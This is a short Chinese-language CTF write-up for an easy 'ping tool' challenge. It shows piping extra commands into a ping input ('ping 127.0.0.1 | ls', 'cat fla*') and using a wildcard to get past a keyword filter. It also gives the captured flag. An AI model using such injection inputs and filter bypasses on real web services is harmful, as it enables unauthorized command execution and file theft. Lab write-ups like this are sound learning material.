@@ -1,0 +1,29 @@
+# ?CTF 2025 Platform(公开赛道) [Week1] 前端小游戏 (难度：Easy)
+**Writer：DreamLost（QQ ID：Scarlet Secret）**<br>
+**Solve Time: 2025-10-05 01:59:33**<br>
+**Rank #155**<br>
+## 题目背景
+给你一个ping工具，然后狠狠的想办法ping我吧！<br>
+
+## 解题思路
+前端经典ping，这大概率是直接透过工具直接访问shell<br>
+利用Bash管道同时执行ping和ls命令得：
+
+```bash
+ping 127.0.0.1 | ls
+flag.txt
+index.php
+```
+
+如果我们直接cat flag.txt则会返回：
+```bash
+ping 127.0.0.1 | cat flag.txt
+输入包含敏感内容，已被过滤！
+```
+
+既然确定了是shell（无论是bash还是什么），我们都可以尝试一下通配符“*”帮我们自动补全：
+```bash
+ping 127.0.0.1 | cat fla*
+flag{a34f2f80-b562-4e78-8000-69a1515088f7}
+```
+轻松加愉快~
